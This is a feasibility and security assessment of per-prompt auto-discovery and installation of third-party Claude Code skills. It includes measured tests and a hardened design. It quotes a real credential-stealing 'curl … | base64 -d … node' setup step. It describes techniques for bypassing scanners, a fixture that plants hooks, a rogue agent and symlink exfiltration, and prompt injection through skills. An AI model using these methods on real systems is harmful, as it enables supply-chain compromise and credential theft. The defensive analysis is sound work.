# Feasibility Assessment: Per-Prompt Auto-Discovery of Third-Party Claude Skills (revision 2)

Date: 2026-09-15. Local: Claude Code 2.1.273, macOS, skills CLI 1.5.26 (npx-cached), `~/.claude/settings.json` has `permissions.defaultMode: "auto"` and `skipDangerousModePermissionPrompt: true`. Changes vs. the prior draft: SHA pinning exists (prior draft said it did not); the "prose-only filter" was wrong because `npx skills add` copies whole folders that can become plugins; the `!`-based loader contradicted the hardening advice and is replaced by a hook-based loader; same-turn behaviour and cache cost were measured; the Anthropic-native trust anchor was researched separately on 2026-09-24: see `2026-09-24-anthropic-vetted-supply.md` (short version: Anthropic-authored supply is small; community-marketplace public screening is schema-only; 'Anthropic verified' badge is web-only and not machine-readable; SHAs move nightly).

## 1. Verdict

**Partially exists.** Every mechanical piece ships today: headless `npx skills find`/`use`/`add` (with undocumented commit-SHA pinning), a `UserPromptSubmit` hook that runs before every prompt, mid-session skill hot-reload, and same-turn Skill-tool invocation of a just-written skill; reactive suggest-then-confirm discovery is mainstream (Vercel `find-skills`, 3.4M installs; Claude Code's native plugin suggestions), but no adopted tool wires these into an unattended per-prompt search-and-install loop, and the two that tried are dead or unadopted (skillless 38 stars, auto-skill-manager 0 stars). **Your 4-step flow works in-turn only through one path, and it is unreliable:** a skill written by the hook is *not* in the model's skill listing for the first request of the triggering turn (measured, 3/3 runs), so step 3 depends on the hook naming the skill in `additionalContext` and Claude choosing to invoke it, which Sonnet refused as prompt injection in 5 of 8 runs; the "skillify the prompt" bonus can only *append* context (hooks cannot rewrite the prompt). **Step 2's unattended download is contraindicated** by Anthropic's guidance, a measured 13.4% critical-issue base rate, a real 1.7M-install credential-theft campaign on skills.sh whose scanners are bypassable in under an hour, and a copy path that turns any downloaded skill folder into a full plugin (hooks, MCP servers, `bin/` on PATH) at user scope with no trust dialog; the recommendation is local routing over a curated pinned library, with allowlist-gated, SHA-pinned, *ephemeral* retrieval behind one typed command.

## 3. Why it WOULD work (verified mechanisms)

- **Per-prompt trigger.** `UserPromptSubmit` "runs when the user submits a prompt, before Claude processes it," receives `prompt`, `cwd`, `session_id`; a `command`/`http`/`mcp_tool` hook returns `hookSpecificOutput.additionalContext` (system reminder; 10,000-char cap, overflow spilled to a file with preview); default timeout 30 s, raisable per hook. [hooks](https://code.claude.com/docs/en/hooks)
- **Headless search.** `npx -y skills@latest find react </dev/null` prints `owner/repo@skill  N installs`; backend `GET https://skills.sh/api/search?q=&limit=` is anonymous JSON (~1.0 s, honors `limit` up to at least 1000). `src/find.ts` lines 17/91.
- **Retrieval without install, with commit pinning.** `npx skills use owner/repo@skill` printed the SKILL.md wrapped as a prompt (7,619 bytes, ~2 s), writing only to a temp dir. `owner/repo#<40-hex-sha>@skill` works for both `use` and `add`: cli.mjs `parseFragmentRef` (120-141), `isCommitSha` (702), `cloneRepo` → `cloneAtSha` fallback (873-889, 708-719). Verified live: pinned to `d65b69e0…` returned the January text ("57 rules"), HEAD returned "70 rules"; a bogus SHA exits 1 with empty stdout ("Remote branch 0000… not found"). `add` records `ref` + `computedHash` in `skills-lock.json`, and `skills update` re-installs at the same `ref` (cli.mjs 6108-6124, 6935-6949; verified). Undocumented in README/`--help`. Also pin the CLI (`skills@1.5.26`, not `@latest`).
- **Scripted install + public audits.** `npx skills add … --agent claude-code -y --json` returned `security: {gen:"safe", socket:"0 alerts", snyk:"low"}`; `GET https://skills.sh/api/v1/skills/audit/{source}/{skill}` is public (200, five providers). [skills.sh/docs/api](https://www.skills.sh/docs/api)
- **Hot-reload, with a measured timing rule.** Docs: changes under `~/.claude/skills/`, project `.claude/skills/`, or `--add-dir` are "picked up within the current session" (v2.1.0); `/reload-skills` (v2.1.152); `SessionStart` may return `reloadSkills: true`. Measured on 2.1.273 (`claude -p`, Sonnet, 12 runs): a skill written by a `UserPromptSubmit` hook is absent from the listing in the *first* model request of that turn (E1/E2/E3, even with 2 s sleep and via `--add-dir`) but appears at the *next* request, which can still be inside the same turn if a tool call comes first (E6b), and always on the next turn (E7 `--resume`, C1/D1). `SessionStart` + `reloadSkills:true` puts it in the first request (E11), but that hook sees no prompt. [skills](https://code.claude.com/docs/en/skills), CHANGELOG 2.1.0/2.1.152/2.1.174.
- **Same-turn invocation by name.** The Skill tool invoked a hook-written skill by exact name in the first request of the same turn even though it was not listed (E8/E8b: "Launching skill: zz-probe-fixed" → "ZZPROBE-LOADED"), and the full chain (hook installs skill + factual one-line `additionalContext` naming it → Skill invoked → instructions applied) completed once (E12a). Scratchpad files `E8.jsonl`, `E8b.jsonl`, `E12a.jsonl`.
- **Cache cost is negligible.** A mid-session skill did not invalidate the prompt cache (`cache_read_input_tokens` identical to control, 27,762; +61/62 cache-creation tokens); a 2,048-char `additionalContext` each turn cost +785-840 cache-creation tokens (~$0.0035/turn on Sonnet) and accumulates. Consistent with CHANGELOG 2.1.174 ("only changed skills are now re-announced").
- **A hook-based loader exists that survives hardening.** `UserPromptExpansion` "runs when a user-typed command expands into a prompt before reaching Claude," matches on `command_name`, receives `command_args`, and can return `additionalContext` or block via exit 2 (hooks.md 1397-1445); the event string is present in the 2.1.273 binary (19 hits). Docs-verified only; not run live.
- **Stack enrichment is cheap.** Reading `package.json`/`pyproject.toml`/git is milliseconds; `claude -p --model haiku` rewriting measured ~6 s and $0.03 per prompt.
- **Your machine is ready.** `~/.claude/settings.json` already registers `UserPromptSubmit` command hooks; `~/.claude/skills/` exists (51 entries) so hot-reload works there; the Karpathy skill you cited is already installed (`andrej-karpathy-skills@karpathy-skills`, pure-prose 2,518-byte SKILL.md), as are `frontend-design`, Vercel `react-best-practices`, `ui-ux-pro-max`, `superpowers` 6.3.0, `context7`, `skill-creator`. No installed plugin SKILL.md uses `allowed-tools`, `hooks:` or `` !` `` (grep across the plugin cache: no matches).

## 4. Why it would NOT work / hard limits

**Security (the blocker for unattended install)**
- Anthropic: "Use Skills only from trusted sources: those you created yourself or obtained from Anthropic" ([overview](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview)); "Never deploy Skills from untrusted sources without a full audit" ([enterprise](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/enterprise)); "Plugins and marketplaces are highly trusted components that can execute arbitrary code on your machine with your user privileges" ([discover-plugins](https://code.claude.com/docs/en/discover-plugins)). Anthropic's skill scanning covers claude.ai/Cowork Enterprise uploads and enterprise marketplaces, not Claude Code local skills.
- Base rate: Snyk ToxicSkills (Feb 5, 2026), 3,984 skills from ClawHub + skills.sh: 13.4% (534) critical, 36.82% flawed, 76 confirmed malicious, 91% of those via prompt injection ([snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)). Koi ClawHavoc: 341 of 2,857 ClawHub skills malicious ([THN](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)).
- Live campaign on the registry you would query: Zenity (Aug 6, 2026) found typosquatted Paperclip skills on skills.sh that accumulated installs while clean, were trojanized July 11, reached 1.7M aggregate installs by Aug 2, with SKILL.md setup steps running `curl … | base64 -d > /tmp/t.mjs && node /tmp/t.mjs` to steal SSH/AWS/GCP/Azure/npm/PyPI credentials ([zenity](https://labs.zenity.io/post/attackers-target-agents-via-the-skill-supply-chain)). Install counts are not a safety signal; time-of-check/time-of-use defeats point-in-time gates ([unit42](https://unit42.paloaltonetworks.com/openclaw-ai-supply-chain-risk/)). Unpinned `npx skills use` re-fetches HEAD on every call, which is exactly this exposure; SHA pinning closes it.
- Scanners are advisory and bypassable: Trail of Bits (Jun 3, 2026) got malicious skills past Gen, Socket, Snyk, Cisco and ClawHub's VirusTotal with newline padding, `.pyc` bytecode, a `.docx`-embedded script and LLM-judge injection, three of four in under an hour ([trailofbits](https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/)); CSA (Jun 10) and Adversa (Jul 30, eight scanners) corroborate.
- **A downloaded skill folder is a plugin, not prose.** `copyDirectory` (cli.mjs 2323-2367) excludes only `metadata.json`, `.git`, `__pycache__`, `__pypackages__`, dereferences symlinks (a symlink to `../outside/secret.txt` was copied as a real file: exfiltration into the install) and preserves exec bits. A fixture install landed `.claude-plugin/plugin.json`, `hooks/hooks.json`, `.mcp.json`, `.lsp.json`, `bin/pwn`, `agents/rogue.md` (`permissionMode: bypassPermissions`), `scripts/` under `.claude/skills/<name>/`. Per [plugins-reference](https://code.claude.com/docs/en/plugins-reference) ("Skills-directory plugins"), any folder under a skills dir with `.claude-plugin/plugin.json` "is loaded as a plugin named `<name>@skills-dir` on the next session, with no marketplace and no install step," and at personal scope "Personal-scope plugins have none of these restrictions": MCP servers auto-start, LSP starts, `bin/` joins the Bash PATH, hooks run. The trust dialog applies only in a *project's* `.claude/skills/` (skills.md line 132), so a `-g` install skips it. This path is live here: `superset@skills-dir` is enabled at user scope. CHANGELOG 2.1.157; issue [#63770](https://github.com/anthropics/claude-code/issues/63770).
- **SKILL.md itself carries capability**: `allowed-tools` (turn-scoped self-grant, "Workspace trust doesn't gate this field"), `hooks:` (session-long shell hooks, registered on invoke), `context: fork` + `agent`, `paths`, `shell`, `` !`cmd` `` and ```` ```! ```` fences (run before the model sees the skill; in Manual mode an unmatched non-read-only command aborts unless self-granted via `allowed-tools`; in auto mode since v2.1.271 it runs as a reviewed tool call), `@` file references, symlinked entries. Reversec (May/Jun 2026) and Datadog (May 2026) exfiltrated SSH/AWS keys through these paths ([reversec](https://labs.reversec.com/posts/2026/05/skill-issues-compromising-claude-code-with-malicious-skills-agents-part-1), [datadog](https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/)).
- **Hardening is partial at user scope** ([settings-reference](https://code.claude.com/docs/en/settings-reference)): `disableSkillShellExecution` blocks only `!` (and `\`\`\`!`) in user/project/plugin skills; `disableAllHooks` blocks settings, plugin and frontmatter hooks but not MCP, LSP, `bin/` or `allowed-tools` (and would kill your own pixel-agents/superset hooks); `allowManagedHooksOnly` and `strictPluginOnlyCustomization` are Managed-only and the latter *keeps* plugin hooks and plugin MCP servers; only deleting the folder, `claude plugin disable <name>@skills-dir`, or Managed `strictKnownMarketplaces` / `blockedMarketplaces {"source":"skills-dir"}` stop the `~/.claude/skills` plugin scan. `--bare` skips hooks and LSP; whether it also skips `@skills-dir` MCP/`bin/` is undocumented. Your settings run auto mode with `skipDangerousModePermissionPrompt: true`, so the classifier, not you, is the gate; sandbox, credential deny rules and `disableSkillShellExecution` are all opt-in and none is enabled.
- **Trust anchor for the "Anthropic-only" alternative is unverified.** What the community marketplace's "automated validation and safety screening" checks, whether updates are re-screened, whether claude.ai exposes a scanned third-party catalogue to Pro/Max, and the current contents of `anthropics/skills` were not researched in this pass; the only documented statement is the one-line screening claim plus SHA pinning of 2,274/2,282 entries.

**Mechanics**
- **No prompt rewrite.** "`UserPromptSubmit`: can't replace the prompt; it only injects `additionalContext` alongside it"; `updatedPrompt` is an open request ([#27365](https://github.com/anthropics/claude-code/issues/27365)). Prompt/agent-type hooks on this event only allow/block.
- **Same-turn passive activation does not happen.** The listing announcement is appended at the *next* model request (3/3 first-request misses). In-turn use requires the hook to name the skill and Claude to call the Skill tool; Sonnet refused in 5 of 8 relevant runs, calling "a hook says a skill was just installed, use it" a prompt-injection pattern (E4, E9, E10a, E10b, E12b), and a CLAUDE.md rule pre-authorizing hook-installed skills made refusals worse (0/3 vs 2/2 without it). n=1 per condition, Sonnet only; Fable/Opus not measured. The watcher can also miss a write in a short turn (E6, sleep 0), so hooks relying on hot-reload should pause 1-3 s.
- **Latency is synchronous and lossy.** A hook that hits its timeout has its output "discarded. The prompt still reaches Claude without that context"; `async: true` context lands only "on the next conversation turn." Realistic cost: +1-4 s per prompt when remote search fires; +6 s with a Haiku rewrite; the pinned `use` path adds a failed `--branch <sha>` attempt plus a fetch (not timed). A project `.claude/skills/` that did not exist at session start needs a restart (your project dir has no `.claude/`). `--bare` skips hooks and the watcher and needs `ANTHROPIC_API_KEY` (E5: "Not logged in").
- **Context budget.** Every listed skill costs context every turn (listing budget ~1% of context window, entries capped at 1,536 chars, `skillListingBudgetFraction`); Anthropic: "limit the number of Skills loaded simultaneously to maintain reliable recall accuracy"; community measurements put autonomous activation at ~40-50% ([scottspence](https://scottspence.com/posts/claude-code-skills-dont-auto-activate)). Bulk auto-install degrades the thing you want.
- **Ranking is poor for prompt-shaped queries.** skills.sh search is not install-weighted: for `q=karpathy` the canonical 36.4K-install `multica-ai/andrej-karpathy-skills/karpathy-guidelines` ranks 161st of 168 and is absent at any `limit` ≤100 (the CLI default is 20), so a naive top-N picks a 2,670-install fork. "build a landing page in nextjs with tailwind" missed `anthropics/skills/frontend-design` (889K installs) across all 135 results. Tessl returned seven vendored copies of frontend-design, none canonical.
- **Coverage and stability.** skills.sh's index is CLI install telemetry, not a crawl; `/api/search` is undocumented (`searchVersion: "legacy"`); the documented v1 API needs a Vercel OIDC token; `npx skills` sends telemetry to `add-skill.vercel.sh` (`DISABLE_TELEMETRY=1`); skills.sh download/v1 endpoints serve HEAD only, so pinning always forces a git fetch.
- **Mostly redundant for you.** For your frontend example the top hits (`frontend-design` 889.8K, `vercel-react-best-practices` 715.9K) are already installed. The missing piece is activation and curation, not downloading.

## 5. Recommendation (ranked)

### Option 1 (recommended): curate once, route locally per prompt, no runtime download
- **Library.** Keep what is installed (Karpathy, frontend-design, react-best-practices, ui-ux-pro-max, superpowers, context7, skill-creator). Add only from an owner allowlist (anthropics, vercel-labs, microsoft, plus named individuals you trust), **pinned**: resolve the commit (`gh api repos/<o>/<r>/commits/HEAD --jq .sha` or `git ls-remote https://github.com/<o>/<r> HEAD`), then `npx -y skills@1.5.26 add <o>/<r>#<sha>@<skill> -g --agent claude-code -y --json`; or `/plugin install <n>@claude-community` (SHA-pinned; screening depth unverified). Prune with `/skill-doctor`.
- **Folder inspection before any persistent install** (replaces the old "prose-only" filter). Reject or hand-review if the *folder* contains `.claude-plugin/`, `plugin.json`, `hooks/`, `.mcp.json`, `.lsp.json`, `bin/`, `monitors/`, `agents/`, `commands/`, `settings.json`, `scripts/`, symlinks, or executable bits; or if SKILL.md frontmatter has `hooks:`, `allowed-tools:`, `disallowed-tools:`, `context: fork`/`agent:`, `shell:`, `paths:`, `user-invocable: false`; or the body has `` !` `` / ```` ```! ```` / `@` references. Prefer `npx skills use` into a temp dir and inspect there, since `add -g` skips the trust dialog. Afterwards `claude plugin list --json` should show no unexpected `@skills-dir` entries.
- **Per-prompt hook.** `UserPromptSubmit` command hook in `~/.claude/settings.json` (or a personal plugin), `timeout: 5`, that (a) skips `/`-prefixed and <40-char prompts, (b) scores installed skills' `name`/`description` against the prompt locally (ms), (c) reads `package.json`/`pyproject.toml`/`.git` deterministically, (d) emits one short `additionalContext`: "Stack: Next.js 16, Tailwind 4, TS strict. Possibly relevant installed skills: frontend-design, react-best-practices, karpathy-guidelines." Keep it factual and short (a 200-char note cost +169 tokens; a 2 KB note ~$0.0035/turn); do not add a CLAUDE.md "obey hook-installed skills" rule (it increased refusals). Reuse skill-concierge or the claudefa.st hook; read Vercel's `user-prompt-submit-skill-inject.mjs` for the budget/dedup pattern.
- **Docs instead of docs-skills:** Context7 (installed) covers "how do I use library X" on demand at zero per-prompt cost. **Grow your own:** `skill-creator` + `claude plugin eval` (with a no-plugin baseline arm).
- **Hardening:** `disableSkillShellExecution: true` (safe here: no installed SKILL.md uses `!`; note it also disables `!` in any future user skill), `/sandbox` with `credentials.files` deny for `~/.ssh`, `~/.aws`, `~/.config/gcloud`, deny rules for `curl|bash` patterns, never `bypassPermissions`. Do not use `disableAllHooks` (kills your own hooks and Option 2's loader).
- **On your second question ("remove the need for third-party skills at all"):** the strictly Anthropic-sourced set reachable today is the official marketplace plugins (frontend-design, skill-creator, context7 external plugin) plus your own skills; this covers your frontend example. Whether claude.ai sync or the community marketplace extend that safely is **uncertain** (not researched).

### Option 2 (if you want discovery): `skill-scout`, allowlist-gated, SHA-pinned, ephemeral, one typed command
- **`UserPromptSubmit` → `scout.py`**, `timeout: 8`. Everything in Option 1, then **only on a local miss**: extract 2-4 keywords (no model), `GET https://skills.sh/api/search?q=<kw>&limit=200`, re-sort by `installs`, keep owner ∈ `allowlist.json` **and** installs ≥1,000, check `GET /api/v1/skills/audit/{source}/{skill}` (advisory; drop `fail`/`CRITICAL`), resolve HEAD SHA via `gh api`, cache 24 h by query hash, inject ≤2 KB: "Candidate (not loaded): vercel-labs/agent-skills#516bcc6…@vercel-react-best-practices (716K installs, audits pass). Type `/scout-load vercel-labs/agent-skills#516bcc6…@vercel-react-best-practices`."
- **Loader = `UserPromptExpansion` hook, not `!`.** Stub skill `~/.claude/skills/scout-load/SKILL.md` with `disable-model-invocation: true` (so `/scout-load <args>` exists), plus in `~/.claude/settings.json`: `"UserPromptExpansion": [{"matcher": "scout-load", "hooks": [{"type": "command", "command": "~/.claude/scout/load.sh", "timeout": 20}]}]`. `load.sh` reads `command_args` from stdin JSON, exits 2 (blocks the expansion) unless it matches an allowlisted owner and `^[A-Za-z0-9-]+/[A-Za-z0-9._-]+#[0-9a-f]{40}@[A-Za-z0-9._-]+$`, runs `npx -y skills@1.5.26 use "$args"`, and returns `{"hookSpecificOutput":{"hookEventName":"UserPromptExpansion","additionalContext":"<skill text>"}}` (spill to a file and return the path if >10,000 chars). Nothing is written to `~/.claude/skills/`, so the plugin/hook/MCP/`bin/` surface never exists; frontmatter in the fetched text is inert; the only residual is prompt injection in the prose you chose to load. **Confirmation point = the keystroke.** Compatible with `disableSkillShellExecution: true`; incompatible with `disableAllHooks`. Docs-verified, not run live.
- **Fallback loader if you ever disable hooks:** a user-invocable skill whose body tells Claude to run `npx -y skills@1.5.26 use <pinned ref>` via Bash and show the frontmatter first, with `permissions.allow: ["Bash(npx -y skills@1.5.26 use:*)"]`; relies on model compliance. The `!`-based form (`allowed-tools: Bash(npx -y skills@1.5.26 use:*)`, pattern must match the full command text) works only while `disableSkillShellExecution` is off.
- **`/scout-add`** (user-invoked) → `npx -y skills@1.5.26 add <o>/<r>#<sha>@<skill> -g --agent claude-code -y --json`, then run the folder inspection above and print the audit JSON. **Confirmation point = user-invoked, verdicts shown.**
- Reuse, don't build: search (`/api/search`), fetch (`npx skills use`), install (`npx skills add`), audits (public endpoint), hot-reload (native). Also install `find-skills` itself (`npx -y skills@1.5.26 add vercel-labs/skills#<sha>@find-skills -g`) for reactive "is there a skill for X" moments.
- Per-prompt overhead: ~50 ms local-only; ~1.5-2 s when remote search fires; 0 on cache hit; loader adds ~2 s plus the pinned fetch when you type it.

### Option 3 (rejected): fully automatic per-prompt search + install, no confirmation
Equivalent to auto-executing untrusted prompts with shell reach; contradicts Anthropic's guidance; scanners will not save you (Trail of Bits, Zenity); a copied folder becomes a `@skills-dir` plugin with hooks/MCP/PATH at user scope with no dialog; registry ranking hands you forks; and in-turn use still depends on Claude accepting a hook's "use this new skill" instruction, which it refused 5/8 times. The least-bad form is Option 2 with `scout-load` auto-injected as `additionalContext` (no disk write, SHA-pinned, allowlisted, sandbox + credential deny + `disableSkillShellExecution`, Manual permission mode), but it remains a supply-chain gamble with no adopted precedent.

## 6. Open questions you must decide

1. **Loader verification:** the `UserPromptExpansion` hook design was checked against docs and binary strings only; run it once in the scratchpad (stub skill + hook, bad-ref exit 2, >10,000-char spill) before relying on it.
2. **Allowlist and floor:** which owners and what install threshold (find-skills uses 1K+/100 stars); no registry signal substitutes, and every pin must be a 40-hex SHA you resolved yourself.
3. **Anthropic-native trust anchor (unresearched):** what `claude-community` screening actually checks and whether claude.ai offers a scanned catalogue to Pro/Max; until known, treat `@claude-community` installs like any third-party install and run the folder inspection.
4. **Model and permission posture:** refusal rates were measured on Sonnet only (n=1/condition); decide whether to test on your model, and whether to keep auto mode + `skipDangerousModePermissionPrompt` or switch to Manual + sandbox + `disableSkillShellExecution` + credential deny rules for sessions that load third-party text.
5. **Registry dependency:** skills.sh's undocumented `/api/search` (HEAD-only, telemetry to Vercel) vs. self-hosting an index from SkillsMP / claude-plugins.dev / GitHub code search; and whether `claude --bare` (untestable here without `ANTHROPIC_API_KEY`) is an acceptable isolation mode given it also disables the hooks this design needs.
